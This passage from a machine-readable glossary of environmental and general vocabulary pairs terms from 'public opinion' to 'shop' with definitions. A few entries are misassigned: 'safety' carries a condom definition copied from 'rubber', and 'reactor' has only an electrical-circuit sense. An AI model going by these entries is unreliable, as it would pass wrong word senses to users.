opinion\": [\"The purported, collective view of the public on some issue or problem, typically formulated by selective polling or sampling, and frequently used as a guide to action or decision.\"], \"public opinion polling\": [\"The canvassing of a representative sample of a large group of people on some question in order to determine the general opinion of a group.\"], \"public park\": [\"Park with big trees, ornamental plants, alleys bordered by trees or bushes, fountains and statues situated in a town and whose access is free.\"], \"public participation\": [\"The involvement of citizens in public matters, with the purpose of exerting influence.\"], \"public-private partnership\": [\"A joint venture between corporations and government or between community members and government or business beyond the course of normal interaction.\"], \"public sector\": [\"Segment of the economy run to some degree by government, including national and local governments, government-owned firms and quasi-autonomous non-government organizations.\"], \"public service\": [\"An enterprise concerned with the provision to the public of essentials, such as electricity or water.\\\\n(Source: CED)\"], \"public transport\": [\"The act or the means of conveying people in mass as opposed to conveyance in private vehicles.\\\\n(Source: GOOD)\"], \"public utility\": [\"An enterprise concerned with the provision to the public of essentials, such as electricity or water.\\\\n(Source: CED)\"], \"pulmonary disease\": [\"Any disease pertaining to the lungs.\"], \"pulp\": [\"A soft and moist mass of material usually obtained by pressing or beating a relatively hard object. It is mostly used about vegetable matter.\", \"The soft center of a tooth, where blood vessels and nerve endings are located.\", \"The soft and moist interior of a fruit.\", \"The edible inner of fruit, as opposed to that of animals, fish or nuts.\"], \"pump\": [\"A machine that draws a fluid into itself through an entrance port and forces the fluid out through an exhaust port.\\\\n(Source: MGH)\", \"To use a pump to move (liquid or gas).\", \"To move up and down (e.g. weights in the gym).\"], \"purchase\": [\"The acquisition or the act of buying something by payment of money or its equivalent.\", \"To obtain in exchange for money or goods.\", \"The mechanical advantage gained by being in a position to use a lever.\"], \"purification\": [\"The removal of unwanted constituents from a substance.\"], \"purin\": [\"Any of a number of nitrogenous bases, such as guanine and adenine, that are derivatives of purine and constituents of nucleic acids and certain coenzymes.\\\\n(Source: CED)\"], \"pyrolysis\": [\"The breaking apart of complex molecules into simpler units by the use of heat.\\\\n(Source: MGH)\"], \"quality control\": [\"The inspection, analysis, and other relevant actions taken to provide control over what is being done, manufactured, or fabricated, so that a desirable level of quality is achieved and maintained.\"], \"quality of life\": [\"All the factors that determine the well-being of an individual or societies, including wealth, employment, physical and mental health, environment, education and leisure time.\"], \"quarry\": [\"An open or surface working or excavation for the extraction of building stone, ore, coal, gravel, or minerals.\", \"Animal hunted or caught for food.\", \"A person who is the aim of an attack (especially a victim of ridicule or exploitation) by some hostile person or influence.\"], \"quarrying\": [\"The surface exploitation and removal of stone or mineral deposits from the earth's crust.\\\\n(Source: MGH)\"], \"race relations\": [\"The associations, tensions or harmony between two or more groups of people distinguished by history, culture, religion or physique: distinctions erroneously construed as being based on consistent biological differences and as representing, in effect, species of a human genus.\\\\n(Source: SOC / RHW)\"], \"radar\": [\"A system using beamed and reflected radiofrequency energy for detecting and locating objects, measuring distance or altitude, navigating, homing, bombing and other purposes.\"], \"radiation\": [\"Emission of any rays from either natural or man-made origins, such as radio waves, the sun's rays, medical X-rays and the fall-out and nuclear wastes produced by nuclear weapons and nuclear energy production. Radiation is usually divided between non-ionizing radiation, such as thermal radiation (heat) and light, and nuclear radiation. Non-ionizing radiation includes ultraviolet radiation from the sun which, although it can damage cells and tissues, does not involve the ionization events of nuclear radiation.\\\\n(Source: WRIGHT)\"], \"radiation damage\": [\"Somatic and genetic damage to living organisms caused by exposure to ionizing radiation.\"], \"radiation dose\": [\"The total amount of radiation absorbed by material or tissues, in the sense of absorbed dose, exposure dose, or dose equivalent.\"], \"radiation effect\": [\"Prolonged exposure to ionizing radiation from various sources that can be harmful. Nuclear radiation from fallout from nuclear weapons or from power stations, background radiation from substances naturally present in the soil, exposure to X-rays can cause radiation sickness. Massive exposure to radiation can kill quickly and any person exposed to radiation is more likely to develop certain types of cancer than other members of the population.\\\\n(Source: PHC)\"], \"radiation exposure\": [\"The act or state of being subjected to electromagnetic energy strong enough to ionize atoms thereby posing a threat to human health or the environment.\\\\n(Source: APD / MHD)\"], \"radiation monitoring\": [\"The periodic or continuous surveillance or analysis of the level of radiant energy present in a given area, to determine that its prescribed amount has not been exceeded or that it meets acceptable safety standards.\\\\n(Source: TOE / OMD)\"], \"radiation physics\": [\"The study of ionizing radiation and its effects on matter.\"], \"radiation protection\": [\"Precautionary actions, measures or equipment implemented to guard or defend people, property and natural resources from the harmful effects of ionizing energy.\"], \"radiation sickness\": [\"Damage to the body resulting from excessive exposure to ionizing radiation which causes symptoms like nausea, fatigue, vomiting, and diarrhea and in severe cases loss of hair, hemorrhage, inflammation and death.\"], \"radio\": [\"The process, equipment or programming involved in transmitting and receiving sound signals by electromagnetic waves.\", \"A device that can capture the signal sent over radio waves and render the modulated signal as sound.\"], \"radioactive contamination\": [\"Contamination of a substance, living organism or site caused by radioactive material.\"], \"radioactive emission\": [\"The release of radioactive substances into the environment deriving from nuclear installations and from mining, purification and enrichment operations of radioactive elements.\\\\n(Source: FLGISA)\"], \"radioactive fallout\": [\"The material that descends to the earth or water well beyond the site of a surface or subsurface nuclear explosion.\"], \"radioactive substance\": [\"Any substance that contains one or more radionuclides of which the activity or the concentration cannot be disregarded as far as radiation protection is concerned.\\\\n(Source: ECHO2)\"], \"radioactive tracer\": [\"A radioactive isotope which, when injected into a biological or physical system, can be traced by radiation detection devices, permitting determination of the distribution or location of the substance to which it is attached.\"], \"radioactive waste\": [\"Any waste that emit radiation in excess of normal background level, including the toxic by-products of the nuclear energy industry.\"], \"radioactivity\": [\"The property possessed by some atomic nuclei of disintegrating spontaneously, with loss of energy through emission of a charged particle and/or gamma radiation.\"], \"radionuclide\": [\"A nuclide that exhibits radioactivity.\", \"An unstable isotope of an element that decays or disintegrates spontaneously, emitting radiation.\"], \"radon\": [\"A radioactive gaseous element emitted naturally from rocks and minerals where radioactive elements are present. It is released in non-coal mines, e.g. tin, iron, fluorspar, uranium. Radon is an alpha particle emitter as are its decay products and has been indicted as a cause of excessive occurrence of lung cancer in uranium miners. Concern has been expressed at radon levels in some housing usually adjacent to granite rocks or old tin mining regions.\\\\n(Source: PORT)\"], \"rag\": [\"To make someone rather angry or impatient; to cause annoyance.\", \"A piece of old cloth; a tattered piece of cloth; a shred, a tatter.\"], \"rail traffic\": [\"The movement and circulation of vehicles transporting goods and people on railroad systems.\"], \"rail transport\": [\"Transportation of goods and persons by railway.\\\\n(Source: CEDa)\"], \"rain\": [\"Precipitation in the form of liquid water drops with diameters greater than 0.5 millimetres.\", \"To fall from the clouds in drops of water.\"], \"rain forest\": [\"A forest of broad-leaved, mainly evergreen, trees found in continually moist climates in the tropics, subtropics, and some parts of the temperate zones.\"], \"rainout\": [\"A sporting fixture that could not be completed because of rain.\"], \"rain water\": [\"Water which falls as rain from clouds.\"], \"random test\": [\"A test which does not always yield the same result when repeated under the same conditions.\"], \"rare species\": [\"Species which have a restricted world range.\"], \"raw material\": [\"A crude, unprocessed or partially processed material used as feedstock for a processing operation.\"], \"raw material securing\": [\"Measures used to ensure the provision of or the access to crude, unprocessed or partially processed materials used as feedstock for processing or manufacturing.\\\\n(Source: RHWa /  MHD)\"], \"reaction kinetics\": [\"That branch of physical chemistry concerned with the mechanisms and rates of chemical reactions.\"], \"reactor\": [\"A device that introduces either inductive or capacitive reactance into a circuit, such as a coil or capacitor.\\\\n(Source: MGH)\"], \"reactor safety\": [\"Those studies and activities that seek to minimise the risk of a nuclear reactor accident.\\\\n(Source: RRDA)\"], \"recommendation\": [\"An action which is advisory in nature rather than one having any binding effect.\", \"The act of commending.\"], \"recreation\": [\"Activities that promote refreshment of health or spirits by relaxation and enjoyment.\", \"Any activity, such as play, that diverts, amuses or stimulates.\"], \"recycled paper\": [\"Paper that has been separated from the solid waste stream for utilization as a raw material in the manufacture of a new product.\"], \"recycling\": [\"A resource recovery method involving the collection and treatment of a waste product for use as raw material in the manufacture of the same or a similar product.\"], \"life-cycle management\": [\"Management of all the stages involved in the life of a product such as raw materials acquisition, manufacturing, distribution and retail, use and re-use and maintenance, recycling and waste management, in order to create less environmentally harmful products.\\\\n(Source: PORT)\"], \"red tide\": [\"Sea water which is covered or discoloured by the sudden growth of algal bloom or by a great increase in single-celled organisms, dinoflagellates.\"], \"chemical reduction\": [\"Chemical reaction in which an element gains an electron.\"], \"reed\": [\"Any of various types of tall stiff grass-like plants growing together in groups near water.\"], \"reef\": [\"A line of rocks in the tidal zone of a coast, submerged at high water but partly uncovered at low water.\"], \"refinery\": [\"A factory for the purification of some crude material such as ore, sugar, oil, etc.\\\\n(Source: CED)\"], \"refining\": [\"The processing of raw material to remove impurities. \\\\n\\\\n(Source: PHC)\"], \"reflection\": [\"The return of waves or particles from surfaces on which they are incident.\"], \"reflectometry\": [\"The study of the reflectance of light or other radiant energy.\"], \"refrigerant\": [\"A substance that by undergoing a change in phase (liquid to gas, gas to liquid) releases or absorbs a large latent heat in relation to its volume, and thus effects a considerable cooling effect.\", \"Causing cold or cooling.\"], \"refrigeration\": [\"The cooling of substances, usually food, below the environmental temperature for preservative purposes.\"], \"refrigerator\": [\"A household appliance used for keeping food fresh by refrigeration.\"], \"refuge\": [\"A restricted and isolated area in which plants and animals persisted during a period of continental climatic change that made surrounding areas uninhabitable; especially an ice-free or unglaciated area within or close to a continental ice sheet or upland ice cap, where hardy biotas eked out an existence during a glacial phase. It later served as a center of dispersal for the repopulation of surrounding areas after climatic readjustment.\", \"A shelter from danger or hardship.\", \"A place of safety, refuge or protection.\", \"A shielding or protection against the unpleasant, unwanted, or dangerous.\"], \"refugee\": [\"A person who is outside his country of origin and who, due to well-founded fear of persecution, is unable or unwilling to avail himself of that country protection.\"], \"refuse-sludge compost\": [\"Compost derived by the biodegradation of the organic constituents of solid wastes and wastewater sludges.\"], \"regeneration\": [\"The renewing or reuse of materials such as activated carbon, single ion exchange resins, and filter beds by appropriate means to remove organics, metals, solids, etc.\\\\n(Source: LEE)\"], \"region\": [\"A designated area or an administrative division of a city, county or larger geographical territory that is formulated according to some biological, political, economic or demographic criteria.\", \"A place in or a part of the body in any way indicated.\", \"Any considerable and connected part of a space or surface.\", \"A large area or range of something specified but with undefined boundaries.\", \"A tract of land of undefined size.\"], \"registration\": [\"An instance of or a certificate attesting to the fact of entering in an official list various pieces of information in order to facilitate regulation or authorization, including one's name, contact information and, in some instances, data concerning a specific possession or property.\", \"The act of registering or state of being registered.\"], \"renewable raw material\": [\"Resources that have a natural rate of availability and yield a continual flow of services which may be consumed in any time period without endangering future consumption possibilities as long as current use does not exceed net renewal during the period under consideration.\"], \"ordinance\": [\"A rule established by authority; a permanent rule of action.\"], \"rehabilitation\": [\"A conservation measure involving the correction of past abuses that have impaired the productivity of the resources base.\\\\n(Source: MGH)\"], \"rehousing\": [\"The provision with new or different housing.\"], \"religion\": [\"The expression of man's belief in and reverence for a superhuman power recognized as the creator and governor of the universe.\", \"An institution to express belief in a divine power.\"], \"remote sensing\": [\"The scientific detection, recognition, inventory and analysis of land and water area by the use of distant sensors or recording devices such as photography, thermal scanners, radar, etc.\", \"Complex of techniques for the remote measure of electromagnetic energy emitted by objects.\"], \"removal\": [\"The elimination of substances from a medium or from the environment.\\\\n(Source: RRDA)\", \"The act of removing a part from a whole.\"], \"renaturation\": [\"A process of returning natural ecosystems or habitats to their original structure and species composition.\"], \"renewable resource\": [\"A resource capable of being continuously renewed or replaced through such processes as organic reproduction and cultivation such as those practiced in agriculture, animal husbandry, forestry and fisheries.\"], \"replacement\": [\"Substitution of an atom or atomic group with a different one.\", \"The act of replacing or substituting.\", \"Someone appointed as the substitute of another, and empowered to act for him, in his name or on his behalf.\"], \"representation\": [\"Any conduct or action undertaken on behalf of a person, group, business or government, often as an elected or appointed voice.\"], \"reprocessing\": [\"Restoration of contaminated nuclear fuel to a usable condition.\"], \"reptile\": [\"A class of terrestrial vertebrates, characterized by the lack of hair, feathers, and mammary glands; the skin is covered with scales, they have a three chambered heart and the pleural and peritoneal cavities are continuous.\", \"Any cold-blooded vertebrate of the class Reptilia.\"], \"rescue service\": [\"Service organized to provide immediate assistance to persons injured or in distress.\\\\n(Source: RRDA)\"], \"research\": [\"Scientific investigation aimed at discovering and applying new facts, techniques and natural laws.\", \"A detailed critical inspection.\"], \"research project\": [\"Proposal, plan or design containing the necessary information and data for conducting a specific survey.\"], \"reservoir\": [\"An artificial or natural storage place for water, such as a lake or pond, from which the water may be withdrawn as for irrigation, municipal water supply, or flood control.\"], \"residential area\": [\"Area that has only private houses, not offices and factories.\"], \"residential building\": [\"A building allocated for residence.\"], \"residual risk\": [\"Remaining potential for harm to persons, property or the environment following all possible efforts to reduce predictable hazards.\\\\n(Source: TOE)\"], \"resin\": [\"Any of a class of solid or semisolid organic products of natural or synthetic origin with no definite melting point, generally of high molecular weight.\"], \"resorption\": [\"Absorption or, less commonly, adsorption of material by a body or system from which the material was previously released.\"], \"resource\": [\"Any component of the environment that can be utilized by an organism.\", \"Something that one uses.\"], \"respiration\": [\"The process in living organisms of taking in oxygen from the surroundings and giving out carbon dioxide.\"], \"respiratory air\": [\"Air volumes inspired and expired through the lungs.\"], \"respiratory disease\": [\"A disease of the airways.\"], \"respiratory protection apparatus\": [\"Any of a group of devices that protect the respiratory system from exposure to airborne contaminants; usually a mask with a fitting to cover the nose and mouth.\\\\n(Source: KOREN)\"], \"respiratory tract\": [\"The structures and passages involved with intake, expulsion, and exchange of oxygen and carbon dioxide in the vertebrate body.\"], \"responsibility\": [\"The obligation to answer for an act done, and to repair or otherwise make restitution for any injury it may have caused.\"], \"resting form\": [\"Resistant structure that allows the organism to survive adverse environmental conditions.\\\\n(Source: ALL2)\"], \"restoration\": [\"The process of renewing or returning something to its original, normal or unimpaired condition.\"], \"retail trade\": [\"The sale of goods, in small numbers and directly to the consumer.\"], \"retarding basin\": [\"A basin designed and operated to provide temporary storage and thus reduce the peak flood flows of a stream.\"], \"reusable container\": [\"Any container which has been conceived and designed to accomplish within its life cycle a minimum number of trips or rotations in order to be refilled or reused for the same purpose for which it was conceived.\\\\n(Source: PORT)\"], \"revegetation\": [\"Planting of new trees and, particularly, of native plants in disturbed sites where the vegetation cover has been destroyed, to stabilize the land surface from wind and water erosion and to reclame the land for other uses.\"], \"reverse osmosis\": [\"A technique whereby a solution is forced through a semipermeable membrane under pressure, used to generate drinkable water from sea water, or to separate chemical compounds.\"], \"rice\": [\"An erect grass, Oryza sativa, that grows in East Asia on wet ground and has drooping flower spikes and yellow oblong edible grains that become white when polished.\", \"Seeds of the rice plant (Oryza sativa) used as food.\", \"Boiled rice.\"], \"petition right\": [\"A legal guarantee or just claim enabling a citizen or employee to compose and submit a formal written request to an authority asking for some benefit or favor or for intervention and redress of some wrong.\"], \"right to information\": [\"The individual's right to know in general about the existence of data banks, the right to be informed on request and the general right to a print-out of the information registered and to know the actual use made of the information.\"], \"risk\": [\"The expected number of lives lost, persons injured, damage to property and disruption of economic activity due to a particular natural phenomenon, and consequently the product of the probability of occurrence and the expected magnitude of damage.\\\\n(Source: GUNN /  RRDA)\", \"A qualitative assessment describing the likelihood of an attacker/threat using an exploit to successfully bypass a defender, attack a vulnerability, and compromise a system. (Schneider)\"], \"risk analysis\": [\"A technique used to determine the likelihood or chance of hazardous events occurring (such as release of a certain quantity of a toxic gas) and the likely consequences.\"], \"risk assessment\": [\"The qualitative and quantitative evaluation performed in an effort to define the risk posed to human health and/or the environment by an action or by the presence or use of a specific substance or pollutant.\"], \"risk-benefit analysis\": [\"A systematic process of evaluating and assessing the hazards of loss versus the possibility of financial gain or profit.\"], \"risk communication\": [\"The exchange of information about health or environmental risks among risk assessors and managers, the general public, news media, interest groups, etc.\"], \"risk perception\": [\"A subjective appreciation by individuals which will more often than not bear little relation to the statistical probability of damage or injury.\"], \"risk reduction\": [\"Any act, instance or process lowering the probability that harm will come to an area or its population as the result of some hazard.\"], \"river\": [\"A stream of water which flows in a channel from high ground to low ground and ultimately to a lake or the sea, except in a desert area where it may dwindle away to nothing.\"], \"river water\": [\"Water which flows in a channel from high ground to low ground and ultimately to a lake or the sea, except in a desert area where it may dwindle away to nothing.\\\\n(Source: WHIT)\"], \"road\": [\"A long piece of hard ground that people can drive along from one place to another.\"], \"road safety\": [\"Any measure, technique or design intended to reduce the risk of harm posed by moving vehicles along a constructed land route.\\\\n(Source: RHW)\"], \"road salt\": [\"Salt used against the formation of ice on roads.\"], \"road traffic\": [\"Circulation of motor vehicles and people on the road network.\"], \"road traffic engineering\": [\"Discipline which includes the design of highways and pedestrian ways, the study and application of traffic statistics, and the environmental aspects of the transportation of goods and people.\\\\n(Source: CED)\"], \"rock\": [\"Any aggregate of minerals that makes up part of the earth's crust. It may be unconsolidated, such as sand, clay, or mud, or consolidated, such as granite, limestone, or coal.\", \"To move gently back and forth.\", \"A music style characterized by basic drum-beat, generally 4/4 riffs, based on (usually electric) guitar, bass guitar, drums, and vocals.\"], \"rock wool\": [\"A generic term for felted or matted fibers manufactured by blowing or spinning threads of molten rock, slag, or glass.\\\\n(Source: BJGEO)\"], \"rodent\": [\"Any of the relatively small placental mammals that constitute the order Rodentia, having constantly growing incisor teeth specialized for gnawing.\"], \"root\": [\"The absorbing and anchoring organ of a vascular plant; it bears neither leaves nor flowers and is usually subterranean.\", \"A word from which another word or words are derived.\", \"Origin, beginning of an event, a condition or a period\"], \"rotary furnace\": [\"A heat-treating furnace of circular construction which rotates the workpiece around the axis of the furnace during heat treatment; workpieces are transported through the furnace along a circular path.\"], \"rubber\": [\"A cream to dark brown elastic material obtained by coagulating and drying the latex from certain plants, especially the rubber tree.\", \"A contraceptive device consisting of a thin rubber or latex sheath worn over the penis during intercourse.\", \"An elastic hydrocarbon polymer that naturally occurs as a milky colloidal suspension, or latex, in the sap of some plants.\"], \"rubber processing\": [\"The systematic series of actions in which a solid substance deriving from rubber trees and plants is toughened and treated chemically to give it the strength, elasticity, resistance and other qualities needed for the manufacture of products such as erasers, elastic bands, water hoses, electrical insulation and tires.\\\\n(Source: RHW)\"], \"rubber processing industry\": [\"A sector of the economy in which an aggregate of commercial enterprises is engaged in the manufacture and marketing of natural or synthetic rubber products.\\\\n(Source: RHW)\"], \"rubber waste\": [\"Any refuse or unwanted material made of synthetic or natural rubber, often the byproduct of rubber processing.\\\\n(Source: RHW)\"], \"runoff\": [\"Rate at which water is removed by flowing over the soil surface. This rate is determined by the texture of the soil, slope, climate, and land use cover (e.g. paved surface, grass, forest, bare soil).\\\\n(Source: LANDY)\"], \"rural population\": [\"The total number of persons inhabiting an agricultural or pastoral region.\\\\n(Source: RHW)\"], \"agritourism\": [\"A form of tourism in which holidays are organized in a farm: meals are prepared with natural products and guests are entertained with handicraft, sporting and agricultural activities.\"], \"safety\": [\"The state of being secure from harm, injury, danger or risk.\", \"A contraceptive device consisting of a thin rubber or latex sheath worn over the penis during intercourse.\"], \"safety measure\": [\"An action, procedure or contrivance designed to lower the occurrence or risk of injury, loss and danger to persons, property or the environment.\\\\n(Source: OED / RHW)\"], \"safety rule\": [\"A principle or regulation governing actions, procedures or devices intended to lower the occurrence or risk of injury, loss and danger to persons, property or the environment.\\\\n(Source: OED / RHW)\"], \"safety standard\": [\"A norm or measure applicable in legal cases for any action, procedure or contrivance designed to lower the occurrence or risk of injury, loss and danger to persons, property or the environment.\"], \"safety study\": [\"Research, detailed examination and usually a written report on the need for or efficacy of actions, procedures or devices intended to lower the occurrence or risk of injury, loss and danger to persons, property or the environment.\"], \"salamander\": [\"Any amphibian of the order Urodela (or Caudata). The adults keep their tails by opposition to the frogs and the caecilians.\", \"Name given to most of the species of amphibians of the order Urodela.\"], \"salination\": [\"The accumulation of soluble salts by evaporation of the waters that bore them to the soil zone, in a soil of an arid, poorly drained region.\"], \"salmonella\": [\"General name for a family of microorganisms, one of the largest groups of bacteria, that includes those most frequently implicated in food poisoning and gastroenteritis. Unhygienic handling and inadequate cooking of poultry and meat, improper storage of cold meats and, more recently, contamination of battery-reared hen eggs, are the most common sources of salmonella infections.\\\\n(Source: WRIGHT)\"], \"salt content\": [\"Amount of salt contained in a solution.\"], \"salt marsh\": [\"Area of brackish, shallow water usually found in coastal areas and in deltas.\"], \"salt meadow\": [\"A meadow subject to overflow by salt water.\"], \"salt plug\": [\"The core of a salt dome.\"], \"salt\": [\"The reaction product when a metal displaces the hydrogen of an acid.\", \"A condiment (NaCl - Sodium Chloride) used to add to or enhance the flavour of food (commonly with pepper).\", \"Containing salt.\", \"To season with salt.\", \"To preserve with salt.\", \"To spread salt.\", \"Randomly generated data added to an encryption algorithm to increase its effectiveness.\"], \"salt water\": [\"Water that contains dissolved salts.\"], \"salvage\": [\"The act, process, or business of rescuing vessels or their cargoes from loss at sea.\"], \"sampling\": [\"The obtaining of small representative quantities of material for the purpose of analysis.\"], \"sampling technique\": [\"Method of selecting items at random from a set in such a manner that the sample will be representative of the whole.\"], \"sanction\": [\"A measure, including removal of diplomatic ties, ban on trade, or military intervention, adopted by a country, or group of countries, against another country for political reasons.\", \"The approval, by some authority, that makes something valid.\"], \"sand\": [\"A loose material consisting of small mineral particles, or rock and mineral particles, distinguishable by the naked eye; grains vary from almost spherical to angular, with a diameter range from 1/16 to 2 millimeters.\", \"To cover with sand.\", \"To rub with sandpaper.\"], \"sand dune fixation\": [\"Stabilization of dunes effected by the planting of marram grass (Ammophila arenaria), or rice grass, whose long roots bind the surface layers of sand and so hinder its removal by wind. A larger scale method of dealing with the same problem is by afforestation.\\\\n(Source: BLYFRE)\"], \"sand dune\": [\"An accumulation of loose sand heaped up by the wind.\"], \"sand extraction\": [\"The extraction of sand by mining for building purposes and for the extraction of heavy minerals such as rutile and zircon.\"], \"sand pit\": [\"A place where sand is extracted from the ground.\"], \"sanitation\": [\"The study and use of practical measures for the preservation of public health.\"], \"sanitation plan\": [\"Plans for the control of the physical factors in the human environment that can harm development, health, or survival.\"], \"saprobic index\": [\"Indication or measure of the level of organic pollution.\"], \"saprobe\": [\"Referring to the classification of organisms according to the way in which they tolerate pollution.\"], \"satellite\": [\"An object that orbits around a larger one.\"], \"saving\": [\"The amount of current income which is not spent for survival or enjoyment.\"], \"sawdust\": [\"Small wood fragments produced by a saw when cutting.\"], \"schistosomiasis\": [\"A disease in which humans are parasitized by any of three species of blood flukes: Schistosoma mansoni, S. haematobium, and S. japonicum; adult worms inhabit the blood vessels.\"], \"school\": [\"An institution or building at which children and young people receive education.\", \"Group of a large number of fish (or other sea animals, such as dolphins or whales), normally from the same species, that swim together.\"], \"school teaching\": [\"Instruction or training received in any educational institution, but especially to persons under college age.\\\\n(Source: RHW)\"], \"science\": [\"The study of the physical universe and its contents by means of reproducible observations, measurements, and experiments to establish, verify, or modify general laws to explain its nature and behaviour.\"], \"scrap material\": [\"Recyclable material from any manufacturing process or discarded consumer products.\"], \"scrap material price\": [\"The amount of money or the monetary rate at which materials discarded from manufacturing operations can be bought or sold.\\\\n(Source: TOE / RHW)\"], \"scrap metal\": [\"Any metal material discarded from manufacturing operations and usually suitable for reprocessing.\"], \"scrap vehicle\": [\"Car which is no longer functional and may be dismantled for spare parts or completely demolished.\"], \"screening\": [\"The reduction of the electric field about a nucleus by the space charge of the surrounding electrons.\"], \"sea\": [\"The mass of water occupying all of the Earth's surface not occupied by land, but excluding all lakes and inland seas.\", \"In general, the marine section of the globe as opposed to that of the land.\", \"A body of salt water that is smaller than an ocean and generally in proximity to a continent.\", \"Different parts of the ocean.\", \"The use of the sea (as in, naval operations, the shipping trade, the profession of a sailor, etc.)\", \"The darker parts of the moon's surface.\", \"A large lake.\", \"The volume of water in the sea in relation to the tides.\", \"Condition of the sea with regards to \\u0131ts use (like sailing or swimming).\", \"At sea, the direction of the waves.\", \"A large, heavy wave in the sea.\", \"Wind driven waves.\", \"A large number (of something)\", \"A large horizontal surface.\", \"A great quantity (of a liquid).\", \"A space filled with particles of a certain kind.\", \"A large quantity (of something).\"], \"sea bed\": [\"The bottom of the ocean.\"], \"sea circulation\": [\"Large-scale horizontal water motion within an ocean.\"], \"sea level\": [\"The level of the surface of the ocean; especially, the mean level halfway between high and low tide, used as a standard in reckoning land elevation or sea depths.\"], \"seashore\": [\"The zone of unconsolidated material that extends landward from the low water-line to where there is marked change in material or physiographic form or to the line of permanent vegetation.\"], \"season\": [\"One of the six equal periods into which the Hindu year is divided.\", \"One of the four equal periods into which the year is divided by the equinoxes and solstices, resulting from the apparent movement of the sun north and south of the equator during the course of the earth's orbit around it. These periods (spring, summer, autumn and winter) have their characteristic weather conditions in different regions, and occur at opposite times of the year in the N and S hemispheres.\", \"A yearly recurring period of undetermined length, relatively long but still shorter than a year, when a certain crop is ripe or a certain type of work, most commonly related to agriculture, is being performed.\", \"A predetermined series of cultural events; for example theatrical performances or  sports events, that take place under an extended period of time, which however is shorter than a year.\", \"To add spices.\"], \"seasonal migration\": [\"The periodic movement of a population from one region or climate to another in accordance with the yearly cycle of weather and temperature changes.\"], \"sea water\": [\"Water found in the seas or oceans which has an average salinity of about 3.5%.\"], \"sea water desalination\": [\"Removal salt from ocean or brackish water.\"], \"secondary biotope\": [\"In the case of disruption of an existing biotope, secondary biotope can be created as a compensation and substitute measure for the loss of the natural one.\\\\n(Source: RRDA)\"], \"secondary education\": [\"The years of instruction following elementary school and until the end of high school.\\\\n(Source: COE)\"], \"secondary sector\": [\"The part of a country or region's economy that produces commodities without much direct use of natural resources.\"], \"second-hand goods\": [\"Goods or products that have been used previously.\"], \"economic sector\": [\"A part of a country's or region's commercial, industrial and financial activity, delimited either by public, corporate and private organization of expenditures or by agriculture, manufacturing and service product types.\"], \"sedimentary basin\": [\"A geomorphic feature of the earth in which the surface has subsided for a prolonged time, including deep ocean floors, intercontinental rifts and elevated and interior drainage basins.\"], \"sediment\": [\"Any material transported by water which will ultimately settle to the bottom after the water loses its transporting power.\\\\n(Source: LANDY)\", \"Matter deposited by some natural process.\"], \"seed dressing\": [\"A chemical applied before planting to protect seeds and seedlings from disease or insects.\"], \"water seepage\": [\"The slow movement of water through small openings and spaces in the surface of unsaturated soil into or out of a body of surface or subsurface water.\\\\n(Source: MGH)\"], \"seismic activity\": [\"The phenomenon of Earth movements.\"], \"seismic monitoring\": [\"The gathering of seismic data from an area.\"], \"seizure\": [\"The official or legally authorized act of taking away possessions or property, often for a violation of law or to enforce a judgment imposed by a court of law.\"], \"selenium\": [\"A highly toxic, nonmetallic element with symbol Se and atomic number 34; used in analytical chemistry, metallurgy, and photoelectric cells.\"], \"self-purification\": [\"A natural process of organic degradation that produces nutrients utilized by autotrophic organisms.\\\\n(Source: LBC)\"], \"semiconductor\": [\"A solid crystalline material whose electrical conductivity is intermediate between that of a metal and an insulator and is usually strongly temperature-dependent.\"], \"semimanufactured product\": [\"Product that has undergone a partial processing and is used as raw material in a successive productive step.\\\\n(Source: ZINZAN)\"], \"semi-metal\": [\"An element having some properties characteristic of metals and others of non-metals.\"], \"sensitivity analysis\": [\"A formalized procedure to identify the impact of changes in various model components on model output. Sensitivity analysis is an integral part of simulation experimentation and may influence model formulations. It is commonly used to examine model behaviour. The general procedure is to define a model output variable that represents an important aspect of model behaviour. The values of various inputs of the model are then varied and the resultant change in the output variable is monitored. Large changes in the output variable imply that the particular input varied is important in controlling model behaviour. Within this general definition, sensitivity analysis has been applied to a variety of model inputs including state variables, environmental variables and initial conditions.\\\\n(Source: YOUNG)\"], \"separator\": [\"A machine for separating materials of different specific gravity by means of water or air.\"], \"septic tank\": [\"A tank, usually underground, into which sewage flows, the deposited matter being wholly, or partially broken down through anaerobic action.\"], \"sequestration\": [\"1) A legal term referring generally to the act of valuable property being taken into custody by an agent of the court and locked away for safekeeping, usually to prevent the property from being disposed of or abused before a dispute over its ownership can be resolved.\\\\n2) The taking of someone's property, voluntarily (by deposit) or involuntarily (by seizure), by court officers or into the possession of a third party, awaiting the outcome of a trial in which ownership of that property is at issue.\\\\n(Source: DUC /  EMBMO)\", \"The act of segregating or sequestering.\"], \"snake\": [\"Any reptile of the suborder Serpentes, typically having a scaly cylindrical limbless body, fused eyelids, and a jaw modified for swallowing large prey.\"], \"services\": [\"The business sector that consists of companies whose line of work involves doing something for customers, but that do not produce goods.\", \"A service station to get food and eat something, often found at motorways.\"], \"settlement concentration\": [\"The distribution or total amount of communities, villages and houses within a specified geographic area.\"], \"urban sprawl\": [\"The expansion of urban areas into surrounding rural areas, creating low-density neighbourhoods.\"], \"settling tank\": [\"A tank into which a two-phase mixture is fed and the entrained solids settle by gravity during storage.\"], \"sewage\": [\"A liquid composed by waste substances in decomposition that is conveyed in sewers.\"], \"sewage farm\": [\"Area of land on which sewage or any other type of waste water is distributed in order to purify it.\"], \"sewage sludge\": [\"A semi-liquid waste with a solid concentration in excess of 2500 parts per million, obtained from the purification of municipal sewage.\"], \"sewerage system\": [\"System of pipes, usually underground, for carrying waste water and human waste away from houses and other buildings, to a place where they can be safely get rid of.\"], \"shellfish\": [\"An aquatic invertebrate, such as a mollusc or crustacean, that has a shell.\"], \"shielding device\": [\"Barrier devised for keeping people away from harmful substances.\"], \"shifting cultivation\": [\"Agricultural practice using the rotation of fields rather than crops, short cropping periods followed by long fallows and the maintenance of fertility by the regeneration of vegetation.\\\\n(Source: PHC)\"], \"ship\": [\"A vessel propelled by engines or sails for navigating on the water, especially a large vessel that can not be carried aboard another, as distinguished from a boat.\", \"A boat that by its size, solidity and power is appropriate for long navigations and big marine enterprises.\"], \"shipbuilding\": [\"The art or business of designing and constructing ships.\"], \"shipping accident\": [\"An unexpected incident, failure or loss involving a vessel or its contents in the course of commercial transport that poses potential harm to persons, property or the environment.\\\\n(Source: RHW)\"], \"ship garbage\": [\"Domestic and operational wastes, disposed of continuously or periodically, that are generated during the normal operation of a ship; usually excluding fresh fish waste from fishing operations.\"], \"shooting range\": [\"Area designed for target shooting.\"], \"shop\": [\"A place, especially a small building, for the retail sale of goods and services.\", \"To visit shops; to look around shops with the intention of buying something.\"], 